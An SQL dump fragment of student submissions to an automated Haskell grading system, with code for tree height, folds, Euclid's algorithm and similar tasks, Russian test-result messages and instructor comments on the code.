(894, 39, '355679', '2012-09-22 16:12:03', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\n\r\n\r\nminHeight node = minHeight1 (1 / 0) 0 node\r\n\r\n\r\n\r\nminHeight1 minH	cur (Node _ Empty Empty) = min minH cur\r\n\r\nminHeight1 minH cur (Empty) = minH\r\n\r\nminHeight1 minH cur (Node _ l r) = \r\n\r\n	let {\r\n\r\n		next = cur + 1\r\n\r\n	} in (\r\n\r\n		if (next >= minH) then\r\n\r\n			minH\r\n\r\n		else\r\n\r\n			minHeight1 (minHeight1 minH next l) next r\r\n\r\n	)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(895, 38, '533223', '2012-09-22 18:57:24', 0, 'data Tree = Empty| Node Int Tree Tree\r\n\r\nheight Empty = 0\r\nheight (Node x l r) = 1 + (max (height l) (height r))', 'Выражение имеет неправильное значение: height (Node 1 Empty Empty)'),
(896, 38, '533223', '2012-09-22 19:00:10', 1, 'data Tree = Empty| Node Int Tree Tree\r\n\r\nheight Empty = 0\r\nheight (Node x Empty Empty) = 0\r\nheight (Node x l r) = 1 + (max (height l) (height r))', '<br/>Тесты успешно пройдены!'),
(897, 38, 'erwert', '2012-09-22 19:02:31', 0, 'height t = hh t - 1\r\nhh Empty = 0\r\nhh (Node x l r) = 1 + hh l + hh r', 'Не удалось вычислить выражение "height (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(898, 38, 'erwert', '2012-09-22 19:03:50', 0, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nheight t = hh t - 1\r\nhh Empty = 0\r\nhh (Node x l r) = 1 + hh l + hh r', '<br/>Тесты успешно пройдены!'),
(899, 35, '787463', '2012-09-22 19:26:53', 1, 'isosc x y z = \r\n  let\r\n    a = len x y\r\n    b = len y z\r\n    c = len z x\r\n  in a == b || b == c || c == a\r\nlen (x1, y1) (x2, y2) = sqrt ((x1 - x2)^2 + (y1 - y2)^2)', '<br/>Тесты успешно пройдены!'),
(900, 36, '787463', '2012-09-22 19:27:24', 1, 'cubeTable n = map (i -> (i, i^3)) [1..n]', '<br/>Тесты успешно пройдены!'),
(901, 37, '787463', '2012-09-22 19:27:59', 1, 'minsum (x:xs) = \r\n    let\r\n      (_:ys) = foldl ((z:zs) t -> (t:(t + z):zs)) [x] xs\r\n    in minimum ys', '<br/>Тесты успешно пройдены!'),
(902, 38, '787463', '2012-09-22 19:28:13', 1, 'data Tree = Empty | Node Integer Tree Tree\r\nheight Empty = -1\r\nheight (Node _ l r) = max (height l) (height r) + 1', '<br/>Тесты успешно пройдены!'),
(903, 39, '787463', '2012-09-22 19:28:45', 0, 'minHeight t = minHeight'' t (1/0) 0\r\nminHeight'' Empty minH h = minH\r\nminHeight'' (Node _ Empty Empty) _ h = h\r\nminHeight'' (Node _ l r) minH h\r\n  | minH <= h = minH\r\n  | otherwise =\r\n      let\r\n        minH1 = min minH (minHeight'' l minH (h + 1))\r\n      in minHeight'' r minH1 (h + 1)', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(904, 39, '787463', '2012-09-22 19:29:22', 1, 'data Tree = Empty | Node Integer Tree Tree\r\nminHeight t = minHeight'' t (1/0) 0\r\nminHeight'' Empty minH h = minH\r\nminHeight'' (Node _ Empty Empty) _ h = h\r\nminHeight'' (Node _ l r) minH h\r\n  | minH <= h = minH\r\n  | otherwise =\r\n      let\r\n        minH1 = min minH (minHeight'' l minH (h + 1))\r\n           --- Мне кажется, тут min не нужен, ваша функция и не может вернуть число, большее minH, ваш алгоритм так устроен\r\n      in minHeight'' r minH1 (h + 1)', '<br/>Тесты успешно пройдены!'),
(905, 40, '787463', '2012-09-22 19:29:46', 1, 'frame n =\r\n  let\r\n    generateline m isBound = map (	 -> if isBound || t == 1 || t == n then 1 else 0) [1..n]\r\n    generateLine'' m\r\n      | m == 1 || m == n = generateline m True\r\n      | otherwise = generateline m False\r\n  in map generateLine'' [1..n]', '<br/>Тесты успешно пройдены!'),
(906, 41, '787463', '2012-09-22 19:30:01', 1, 'countOdd xs = foldr (x res -> if mod x 2 == 1 then res + 1 else res) 0 xs\r\ncountOdd1 xs = sum (map (x -> mod x 2) xs)', '<br/>Тесты успешно пройдены!'),
(907, 42, '787463', '2012-09-22 19:30:26', 0, 'myfoldl _ e [] = e\r\nmyfoldl f e (x:xs) = myfoldl f (f x e) xs\r\n--myfoldl f e xs = foldr f e (reverse xs) -- или так', 'Выражение имеет неправильное значение: myfoldl (^) 2 [3]'),
(908, 38, 'erwert', '2012-09-22 19:33:01', 1, 'data Tree = Empty | Node Integer Tree Tree\r\nheight t = hh t - 1\r\nhh Empty = 0\r\nhh (Node x l r) = 1 + max (hh l) (hh r)', '<br/>Тесты успешно пройдены!'),
(909, 42, '787463', '2012-09-22 19:34:23', 1, 'myfoldl _ e [] = e\r\nmyfoldl f e (x:xs) = myfoldl f (f e x) xs', '<br/>Тесты успешно пройдены!'),
(910, 41, '12206137', '2012-09-22 20:03:44', 1, '(>>>) f g = (x -> g $ f $ x)\r\n\r\n\r\n\r\ncountOdd = foldr (x res -> if x `mod` 2 == 0 then res else res+1) 0\r\n    --- Или, просто как вариант, x res -> res + x `mod` 2\r\n\r\ncountOdd1 = filter (x -> x `mod` 2 == 1) >>> length', '<br/>Тесты успешно пройдены!'),
(911, 42, '12206137', '2012-09-22 20:04:03', 1, 'myfoldl _ acc [] = acc\r\n\r\nmyfoldl f acc (x:xs) = myfoldl f (f acc x) xs\r\n', '<br/>Тесты успешно пройдены!'),
(912, 39, 'erwert', '2012-09-22 20:14:14', 0, 'data Tree = Empty | Node Integer Tree Tree deriving Eq\r\nminHeight t = hm t - 1\r\nhm Empty = 0\r\nhm (Node x l r) = 1 + min (hm l) (hm r)', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
(913, 36, 'hasp', '2012-09-22 20:51:00', 1, 'cubeTable n = map (e -> (e, e*e*e)) [1..n]', '<br/>Тесты успешно пройдены!'),
(914, 37, 'hasp', '2012-09-22 20:55:10', 1, 'minsum [] = 0\r\nminsum l@(x:xs) =  minimum (map (e -> (fst e) + (snd e) ) (zip l xs) )\r\n   --- ну или немного короче (x, y) -> x+y)', '<br/>Тесты успешно пройдены!'),
(915, 38, 'hasp', '2012-09-22 21:01:31', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nheight tr = let heightI Empty = 0; heightI tr@(Node _ lft rght) = 1 + (max (heightI lft) (heightI rght) ) in (heightI tr) - 1', '<br/>Тесты успешно пройдены!'),
(916, 39, 'hasp', '2012-09-22 21:28:38', 0, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nminHeight tr = let minHeightI _ curH Empty = curH;\r\n				   minHeightI (-1) curH tr@(Node _ lft rght) = let newMin = (minHeightI (-1) (curH+1) lft) in (minHeightI newMin (curH+1) rght);\r\n				   minHeightI lim curH tr@(Node _ lft rght) = if curH >= lim then lim else \r\n						let newMin = min lim (minHeightI lim (curH+1) lft) in (minHeightI newMin (curH+1) rght) in (minHeightI (-1) 0 tr) - 1', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
(917, 39, 'hasp', '2012-09-22 21:53:51', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nminHeight tr = let minHeightI _ curH (Node _ Empty Empty) = curH + 1;\r\n				   minHeightI (-1) curH (Node _ lft rght) = let nc = curH + 1 in let newMin = (minHeightI (-1) nc lft) in (minHeightI newMin nc rght);\r\n				   minHeightI lim curH (Node _ lft Empty) = if (curH >= lim) then lim else minHeightI lim (curH + 1) lft;\r\n				   minHeightI lim curH (Node _ Empty rght) = if (curH >= lim) then lim else minHeightI lim (curH + 1) rght;\r\n				   minHeightI _ cur Empty = cur;\r\n				   minHeightI lim curH (Node _ lft rght) = if curH >= lim then lim else \r\n						let newMin = min lim (minHeightI lim (curH+1) lft) in (minHeightI newMin (curH+1) rght) in (minHeightI (-1) 0 tr) - 1\r\n', '<br/>Тесты успешно пройдены!'),
(918, 40, 'hasp', '2012-09-22 22:01:16', 1, 'frame n = (replicate n 1):[ if x == n-1 then replicate n 1 else 1:(replicate (n-2) 0)++[1] | x <- [1..(n-1)] ]', '<br/>Тесты успешно пройдены!'),
(919, 41, 'hasp', '2012-09-22 22:06:17', 2, '--смысл написания двух функций ускользает от меня...\r\ncountOdd ls = foldr (e a -> if e `mod` 2 /= 0 then a + 1 else a) 0 ls\r\ncountOdd1 ls = foldl (a e -> if e `mod` 2 /= 0 then a + 1 else a) 0 ls\r\n  --- ОК, ч некорректно написал, действительно. Во второй функции нельзя использовать ни foldr ни foldl \r\n  --- (и никакие другие fold.. вроде foldr1 тоже нельзя:) - остальные стандартные функции можно. \r\n  ---Напишите что-нибудь такое, пожалуйста.', '<br/>Тесты успешно пройдены!'),
(920, 42, 'hasp', '2012-09-22 22:09:38', 1, 'myfoldl _ acc [] = acc\r\nmyfoldl f acc (x:xs) = myfoldl f (f acc x) xs', '<br/>Тесты успешно пройдены!'),
(921, 35, 'hasp', '2012-09-22 22:19:36', 1, 'isocI (x1,y1) (x2,y2) = let x = x1 - x2 in let y = y1 - y2 in sqrt ( x*x + y*y )\r\n   --- OK. но квадратный корень я бы не извлекал - и быстрее, и точно не будет проблем с округлением\r\nisosc a b c = (isocI a b == isocI a c) || (isocI b c == isocI b a) || (isocI a c == isocI b c)', '<br/>Тесты успешно пройдены!'),
(922, 33, 'hasp', '2012-09-22 22:20:59', 1, '--fun integrate(f: (Double) -> Double, start: Double, end: Double): Double {\r\n--  val stepCount = 150\r\n--  fun step(x_i: Double, x_i_1: Double) = (x_i_1 - x_i)*(f(x_i) + f(x_i_1))/2;\r\n  \r\n--  var sum = 0.0\r\n--  val stepSize = (end - start)/stepCount\r\n--  var current = start\r\n--  \r\n--  for (i in 0..stepCount-1) {\r\n--    sum += step(current, current + stepSize)\r\n--    current += stepSize\r\n--  }\r\n  \r\n--  return sum  \r\n--}\r\n\r\n--fun main(args : Array<String>) {\r\n--  println(integrate({x -> x*x + x*x*x}, 0.1, 1.15))\r\n--}', '<br/>Тесты успешно пройдены!'),
(923, 34, 'hasp', '2012-09-22 22:22:59', 1, '--public class Main {\r\n--    private static final int stepCount = 150;\r\n--\r\n--    /** f :: A1 -> A2 */\r\n--    static interface Function2<A1, A2> {\r\n--        A2 apply(A1 a1);\r\n--    }\r\n--\r\n--    static interface Function3<A1, A2, A3> {\r\n--        A3 apply(A1 a1, A2 a2);\r\n--    }\r\n\r\n--    static double integrate(final Function2<Double, Double> fun, double start, final double end) {\r\n--        assert (start < end);\r\n--        final Function3<Double, Double, Double> step = new Function3<Double, Double, Double>() {\r\n--            public Double apply(Double x_i, Double x_i_1) {\r\n--                return (x_i_1 - x_i)*(fun.apply(x_i) + fun.apply(x_i_1))/2;\r\n--            }\r\n--        };\r\n--\r\n--        double sum = 0.0;\r\n--        final double stepSize = (end - start)/stepCount;\r\n--\r\n--        for (int i = 0; i < stepCount; ++i) {\r\n--            sum += step.apply(start, start + stepSize);\r\n--            start += stepSize;\r\n--        }\r\n--\r\n--        return ', '<br/>Тесты успешно пройдены!'),
(924, 39, 'erwert', '2012-09-23 00:06:33', 2, 'data Tree = Empty | Node Integer Tree Tree deriving Eq\r\nminHeight t = hm t - 1\r\nhm Empty = 0\r\nhm (Node x Empty r) = 1 + hm r\r\nhm (Node x l Empty) = 1 + hm l\r\nhm (Node x l r) = 1 + min (hm l) (hm r)\r\n   --- Нет, не совсем то. Результат у вас, конечно, будет правильный. Но мы говорили про оптимизацию - не заходить\r\n   --- в дерево глубже, чем глубина уже найденного ближайшего листа. Попробуйте что-то такое написать, пожалуйста.', '<br/>Тесты успешно пройдены!'),
(925, 23, '63706456', '2012-09-23 07:38:10', 0, 'split n = splitAcc n 1 1\r\nsplitAcc n m p	| n-m <= m  = if gcd n p > 1 then 0 else 1	\r\n		| (gcd m p) > 1 = splitAcc n (m+1) p\r\n		| otherwise = splitAcc (n-m) (m+1) (p*m) + splitAcc n (m+1) p', 'Не удалось вычислить выражение "c 10", проверьте правильность синтаксиса'),
(926, 23, '63706456', '2012-09-23 07:38:31', 1, 'c n = splitAcc n 1 1\r\nsplitAcc n m p	| n-m <= m  = if gcd n p > 1 then 0 else 1	\r\n		| (gcd m p) > 1 = splitAcc n (m+1) p\r\n		| otherwise = splitAcc (n-m) (m+1) (p*m) + splitAcc n (m+1) p', '<br/>Тесты успешно пройдены!'),
(927, 41, '63706456', '2012-09-23 08:02:52', 1, 'countOdd xs = foldr (x y -> if odd x then y+1 else y) 0 xs\r\ncountOdd1 xs = length $ filter (==True) $ map odd xs\r\n   --- Вообще-то можно просто filter odd xs :)', '<br/>Тесты успешно пройдены!'),
(928, 40, '63706456', '2012-09-23 08:34:54', 1, 'deg f 0 = id\r\ndeg f n = f . deg f (n-1)\r\n\r\nframe 1 = [[1]]\r\nframe n = (outer:(deg (inner:) (n-2) (outer:[])))\r\n		where 	inner = (1:(deg (0:) (n-2) [1]))\r\n			outer = (deg (1:) n [])', '<br/>Тесты успешно пройдены!'),
(929, 35, '63706456', '2012-09-23 08:44:08', 1, 'isosc a b c = 	not $ (ab /= bc) &&\r\n		(bc /= ca) &&\r\n		(ca /= ab)\r\n		where 	dist (a,b) (c,d) = (a-c)^2 + (b-d)^2\r\n			ab = dist a b\r\n			bc = dist b c\r\n			ca = dist c a', '<br/>Тесты успешно пройдены!'),
(930, 42, '63706456', '2012-09-23 08:55:53', 1, 'myfoldl f s [] = s\r\nmyfoldl f s (x:xs) = myfoldl f (f s x) xs', '<br/>Тесты успешно пройдены!'),
(931, 30, '2118411', '2012-09-23 08:57:26', 1, 'parts (xs) = partscheck 2 (xs)\r\n\r\npartscheck k (xs)\r\n                        | k <= (length xs) =  partscheck2 (head xs) 1 k (tail xs) || partscheck (k+1) (xs)\r\n                        | otherwise = False\r\n\r\npartscheck2 _ c k []\r\n                        | c == k = True\r\n                        | otherwise = False\r\npartscheck2 prev c k (x:xs)\r\n                        | (c < k) && (prev >= x) = False\r\n                        | c < k = partscheck2 x (c+1) k xs\r\n                        | otherwise = partscheck2 x 1 k xs', '<br/>Тесты успешно пройдены!'),
(932, 30, 'Deutsche', '2012-09-23 09:28:48', 1, 'parts s = if ((length s == 0)||(length s == 1))\r\n		then False\r\n	  else\r\n		parts1 s 2 (length s)\r\n\r\nparts1 s l n = if ((l==n)&&(checkParts s l n))\r\n		then True\r\n	       else\r\n	       if ((l==n)&&(not (checkParts s l n)))\r\n		then False\r\n	       else\r\n	       if ((l/=n)&&(l+l>n)) \r\n		then parts1 s n n\r\n	       else\r\n	       if ((n `mod` l == 0)&&(checkParts s l n))\r\n		then True\r\n	       else parts1 s (l+1) n\r\n\r\ncheckParts s l n = if ((l/=n)&&(check1part (take l s)))\r\n			then \r\n				let\r\n					l1 = length (drop l s) \r\n				in checkParts (drop l s) l l1\r\n		   else \r\n		   if ((l/=n)&&(not (check1part (take l s))))\r\n			then False\r\n		   else\r\n		   if ((l==n)&&(check1part (take l s)))\r\n			then True\r\n		   else False\r\n\r\ncheck1part (x1:x2:[]) = if (x1<x2) \r\n				then True\r\n			else False\r\n   --- Или просто ... = x1 < x2\r\n\r\ncheck1part (x1:x2:s) = if (x1>=x2)\r\n				then False\r\n		       else check1part (x2:s)', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(933, 40, '533223', '2012-09-23 09:46:58', 1, 'frame n = map (x->if (x==1||x==n) then map (x->1) [1..n]\r\n		else (map (x->if(x==1||x==n) then 1\r\n						else 0) [1..n])) [1..n]', '<br/>Тесты успешно пройдены!'),
(934, 43, '517309', '2012-09-23 09:59:16', 3, 'euclid _ _ = (2, -1)', 'Выражение имеет неправильное значение: let (x,y) = euclid 1 0 in 1*x+0*y'),
(935, 44, '517309', '2012-09-23 10:00:14', 0, 'dioph _ _ = [1,1,1]', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)'),
(936, 44, '517309', '2012-09-23 10:00:58', 3, 'dioph _ _ = [1,2,3]', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [1,1,1,1] [2,2,2,2] in x+y+z'),
(937, 41, 'hasp', '2012-09-23 10:43:23', 1, 'countOdd ls = foldr (e a -> if e `mod` 2 /= 0 then a + 1 else a) 0 ls\r\ncountOdd1 ls = length  (filter (e -> e `mod` 2 /= 0) ls)', '<br/>Тесты успешно пройдены!'),
(938, 30, '533223', '2012-09-23 10:44:06', 1, 'parts xs = check2 xs (fun1 xs 0)\r\n\r\ncheck2 xs 0 = False\r\ncheck2 xs n = if (check xs n n) then True\r\n				else check2 xs (n-1)\r\n\r\ncheck [x] _ 0 = True\r\ncheck (x:xs) n 0 = check xs n n\r\ncheck (x:(y:xs)) n t = if (x<y) then check (y:xs) n (t-1)\r\n			else False\r\ncheck _ _ _ = False\r\n\r\n\r\nfun1 [x] n = n\r\nfun1 (x:(y:xs)) n = if (x<y) then fun1 (y:xs) (n+1)\r\n			else n', '<br/>Тесты успешно пройдены!'),
(939, 35, '2118411', '2012-09-23 11:13:06', 1, '-- на то что это треугольник, а не линия не проверяем\r\n   --- Да и не надо, по моему. Линию можно считать вырожденным треугольником.\r\nisosc (a1, a2) (b1, b2) (c1, c2) = (a == b) || (a == c) || (b == c)\r\n        where\r\n                a = dist (a1, a2) (b1, b2)\r\n                b = dist (a1, a2) (c1, c2)\r\n                c = dist (b1, b2) (c1, c2)\r\nsqr x = x*x\r\ndist (a1, a2) (b1, b2) = sqr (b1 - a1) + sqr (b2 - a2)\r\n', '<br/>Тесты успешно пройдены!'),
(940, 36, '2118411', '2012-09-23 11:13:29', 1, 'cubeTable n = zip [1..n] (map (x->x^3) [1..n])\r\n   --- или можно map (^3)', '<br/>Тесты успешно пройдены!'),
(941, 37, '2118411', '2012-09-23 11:13:48', 0, 'minsum (xs) = foldr min (head tmp) tmp\r\n        where\r\n                tmp = map ((a,b)->a+b) (zip (tail xs++0:[]) xs)\r\n', 'Выражение имеет неправильное значение: minsum [1,1]'),
(942, 37, '2118411', '2012-09-23 11:19:40', 1, 'minsum (xs) = foldr min (head tmp) tmp\r\n        where\r\n                tmp = map ((a,b)->a+b) (zip (tail xs) xs)\r\n', '<br/>Тесты успешно пройдены!'),
(943, 38, '2118411', '2012-09-23 11:20:07', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nheight (Node x l r) = heightRec 0 (Node x l r)\r\nheightRec cur Empty = cur - 1\r\nheightRec cur  (Node _ l r) = max (heightRec (cur + 1) l) (heightRec (cur+1) r)\r\n', '<br/>Тесты успешно пройдены!'),
(944, 39, '2118411', '2012-09-23 11:21:55', 1, 'data Tree = Empty | Node Integer Tree Tree\r\nminHeight (Node x l r) = minHeightRec (0-1) 0 (Node x l r)\r\nminHeightRec global cur Empty\r\n                                | global < 0 = cur - 1\r\n                                | (cur - 1) < global = cur - 1\r\n                                | otherwise = global\r\nminHeightRec global cur (Node x l r)\r\n                                | global >= 0 = if cur >= global\r\n                                                then global\r\n                                                else minHeightRec (min global (minHeightRec global (cur+1) l)) (cur+1) r\r\n                                | otherwise = minHeightRec (minHeightRec global (cur+1) l) (cur+1) r', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
(945, 39, '2118411', '2012-09-23 11:54:44', 0, 'data Tree = Empty | Node Integer Tree Tree\r\nminHeight (Node x l r) = minHeightRec (0-1) 0 (Node x l r)\r\nminHeightRec global cur Empty = global\r\nminHeightRec global cur (Node x Empty Empty)\r\n                                | global < 0 = cur\r\n                                | (cur) < global = cur\r\n                                | otherwise = global\r\nminHeightRec global cur (Node x l r)\r\n                                | global >= 0 = if cur >= global\r\n                                                then global\r\n                                                else\r\n                                                let left = (minHeightRec global (cur+1) l)\r\n                                                in      if (left < 0)\r\n                                                        then (minHeightRec global (cur+1) r)\r\n                                                        else (minHeightRec (min global left) (cur+1) r)\r\n                                | otherwise = minHeightRec (minHeightRec global (c', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(946, 39, '2118411', '2012-09-23 11:56:25', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nminHeight (Node x l r) = minHeightRec (0-1) 0 (Node x l r)\r\n\r\nminHeightRec global cur Empty = global\r\n\r\nminHeightRec global cur (Node x Empty Empty)\r\n\r\n                                | global < 0 = cur\r\n\r\n                                | (cur) < global = cur\r\n\r\n                                | otherwise = global\r\n\r\nminHeightRec global cur (Node x l r)\r\n\r\n                                | global >= 0 = if cur >= global\r\n\r\n                                                then global\r\n\r\n                                                else\r\n\r\n                                                let left = (minHeightRec global (cur+1) l)\r\n\r\n                                                in      if (left < 0)\r\n\r\n                                                        then (minHeightRec global (cur+1) r)\r\n\r\n                                                        else (minHeightRec (min global left) (cur+1) r)\r\n\r\n                                | otherwise = minHeightRec (minHeightRec global (cur+1) l) (cur+1) r\r\n', '<br/>Тесты успешно пройдены!'),
(947, 40, '2118411', '2012-09-23 11:56:56', 1, 'frame n = map (x->if (x==1 || x==n) then (replicate n 1) else (1:(replicate (n-2) 0)++1:[])) [1..n]', '<br/>Тесты успешно пройдены!'),
(948, 41, '2118411', '2012-09-23 11:57:15', 1, 'countOdd (xs) = foldr (x res->if (x `mod` 2 /= 0) then (res+1) else res) 0 xs\r\ncountOdd1 = sum.(map(x->x `mod` 2))\r\n', '<br/>Тесты успешно пройдены!'),
(949, 42, '2118411', '2012-09-23 11:57:30', 1, 'myfoldl f e [] = e\r\nmyfoldl f e (x:xs) = myfoldl f (e `f` x) xs\r\n', '<br/>Тесты успешно пройдены!'),
(950, 31, '3742311', '2012-09-23 11:59:08', 2, 'parts2tmp _ n1 _ n2 [] _ = n1 == n2\r\nparts2tmp l1 n1 l2 n2 (h:t) m = n1 < m && h > l1 && (parts2tmp h (n1 + 1) l2 n2 t m) || n2 < m && h > l2 && (parts2tmp l1 n1 h (n2 + 1) t m)\r\nparts2 l = parts2tmp ((minimum l) - 1) 0 ((minimum l) - 1) 0 l ((length l) / 2)\r\n  --- Здесь вместо / 2 надо деление нацело. Это просто, но исправьте, пожалуйста.', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(951, 33, '2118411', '2012-09-23 12:22:41', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace PrintTable\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static double integral(Func<double, double> f, double a, double b)\r\n\r\n        {\r\n\r\n            double sum = 0.0;\r\n\r\n            int n = 100;\r\n\r\n\r\n\r\n            for (int i = 0; i < n; i++)\r\n\r\n            {\r\n\r\n                // In case of big ''i'' and ''n'' it''s more precise than adding h=(b-a)/n at each step\r\n\r\n                double l = a + (b - a) * i / n;\r\n\r\n                double r = a + (b - a) * (i + 1) / n;\r\n\r\n                double m = (l + r) / 2.0;\r\n\r\n\r\n\r\n                sum += f(m) * (b-a) / n;\r\n                  --- (b-a)/m имеет смысл, наверное, сочитать один раз вне цикла\r\n            }\r\n\r\n            return sum;\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            double result = integral(x => Math.Sin(x), 0, Math.PI);\r\n\r\n            Console.WriteLine(result);\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(952, 34, '2118411', '2012-09-23 12:31:27', 1, '#include "stdafx.h"\r\n\r\n\r\n\r\n#include <iostream>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\ntemplate <class Func>\r\n\r\n\r\n\r\ndouble integral(Func f, double a, double b)\r\n\r\n{\r\n\r\n	double sum = 0.0;\r\n\r\n	int n = 100;\r\n\r\n	\r\n\r\n	for (int i = 0; i < n; i++)\r\n\r\n	{\r\n\r\n		// In case of big ''i'' and ''n'' it''s more precise than adding h=(b-a)/n at each step\r\n\r\n		double l = a + (b - a) * i / n;\r\n\r\n		double r = a + (b - a) * (i + 1) / n;\r\n\r\n		double m = (l + r) / 2.0;\r\n\r\n		\r\n\r\n		sum += f(m) * (b-a) / n;\r\n\r\n	}\r\n\r\n	return sum;\r\n\r\n}\r\n\r\n\r\n\r\nint main()\r\n\r\n{\r\n\r\n	double result = integral([](double x) { return x*x; }, 0, 1);\r\n\r\n	cout << result << endl;\r\n\r\n\r\n\r\n	return 0;\r\n\r\n}\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(953, 43, '2562137', '2012-09-23 13:37:36', 1, 'euclid a b =\r\n	if a == 0 then (0, 1)\r\n	else (y - x * (div b a), x)\r\n		where (x, y) = euclid (mod b a) a\r\n', '<br/>Тесты успешно пройдены!'),
(954, 43, '12206137', '2012-09-23 13:52:20', 1, 'euclid'' 0 d _ _ x2 y2\r\n\r\n    | d >= 0 = (x2, y2)\r\n\r\n    | d < 0 = (-x2, -y2)\r\n\r\n\r\n\r\neuclid'' a b x1 y1 x2 y2 =\r\n\r\n    let r = b `div` a in\r\n\r\n    euclid'' (b - r*a) a (x2 - x1*r) (y2 - y1*r) x1 y1\r\n\r\n\r\n\r\neuclid a b = euclid'' a b 1 0 0 1\r\n\r\n\r\n\r\n-- a = x1 * a0 + y1 * b0\r\n\r\n-- b = x2 * a0 + y2 * b0\r\n\r\n-- b - r*a = \r\n', '<br/>Тесты успешно пройдены!'),
(955, 44, '12206137', '2012-09-23 13:52:32', 0, 'euclid'' 0 d _ _ x2 y2\r\n\n    | d >= 0 = (x2, y2)\r\n\n    | d < 0 = (-x2, -y2)\r\n\n\r\n\neuclid'' a b x1 y1 x2 y2 =\r\n\n    let r = b `div` a in\r\n\n    euclid'' (b - r*a) a (x2 - x1*r) (y2 - y1*r) x1 y1\r\n\n\r\n\neuclid a b = euclid'' a b 1 0 0 1\r\n\n\r\n\ngcd'' 0 d = abs d\r\n\ngcd'' a b = gcd'' (b `mod` a) a\r\n\ngcd'' 0 0 = 0\r\n\n\r\n\n\r\n\nsimplifyList x =\r\n\n    let d = foldl gcd'' 0 x in\r\n\n    if d == 0 then x\r\n\n    else map (`div` d) x\r\n\n\r\n\nmapTuple f (a,b) = (f a, f b)\r\n\n\r\n\nsolve [b,c,d] [k,l,m,n]\r\n\n    | gcd'' b c /= 1 = (0,0,0)\r\n\n    | otherwise =\r\n\n        let (y,z) = mapTuple (* d) $ euclid b c in\r\n\n        let (dy,dz) = (c, -b) in\r\n\n        let [newK, newV, newN] = simplifyList [k, l * c - m * b, n - l*y - m*z] in\r\n\n        if gcd'' newK newV /= 1 then (0,0,0)\r\n\n        else\r\n\n            let (x,dv) = mapTuple (* newN) $ euclid newK newV in\r\n\n            (x, y + dv*dy, z + dv*dz)\r\n\n            \r\n\ndioph [0,b,c,d] x =\r\n\n    solve (simplifyList [b,c,d]) (simplifyList x)\r\n\n\r\n\ndioph [a,b,c,d] [k,l,m,n] =\r\n\n    dioph (zipWith (x y -> x*k - a*y) [a,b,c,d] [k,l,m,n]) [a,b,c,d]\r\n\n    \n', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)", проверьте правильность синтаксиса'),
(956, 44, '12206137', '2012-09-23 13:54:10', 0, 'euclid'' 0 d _ _ x2 y2\r\n    | d >= 0 = (x2, y2)\r\n    | d < 0 = (-x2, -y2)\r\n\r\neuclid'' a b x1 y1 x2 y2 =\r\n    let r = b `div` a in\r\n    euclid'' (b - r*a) a (x2 - x1*r) (y2 - y1*r) x1 y1\r\n\r\neuclid a b = euclid'' a b 1 0 0 1\r\n\r\ngcd'' 0 d = abs d\r\ngcd'' a b = gcd'' (b `mod` a) a\r\ngcd'' 0 0 = 0\r\n\r\n\r\nsimplifyList x =\r\n    let d = foldl gcd'' 0 x in\r\n    if d == 0 then x\r\n    else map (`div` d) x\r\n\r\nmapTuple f (a,b) = (f a, f b)\r\n\r\nsolve [b,c,d] [k,l,m,n]\r\n    | gcd'' b c /= 1 = (0,0,0)\r\n    | otherwise =\r\n        let (y,z) = mapTuple (* d) $ euclid b c in\r\n        let (dy,dz) = (c, -b) in\r\n        let [newK, newV, newN] = simplifyList [k, l * c - m * b, n - l*y - m*z] in\r\n        if gcd'' newK newV /= 1 then (0,0,0)\r\n        else\r\n            let (x,dv) = mapTuple (* newN) $ euclid newK newV in\r\n            (x, y + dv*dy, z + dv*dz)\r\n            \r\ndioph [0,b,c,d] x =\r\n    solve (simplifyList [b,c,d]) (simplifyList x)\r\n\r\ndioph [a,b,c,d] [k,l,m,n] =\r\n    dioph (zipWith (x y -> x*k - a*y) [a,b,c,d] [k,l,m,n]) [a,b,c,d]\r\n    ', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)", проверьте правильность синтаксиса'),
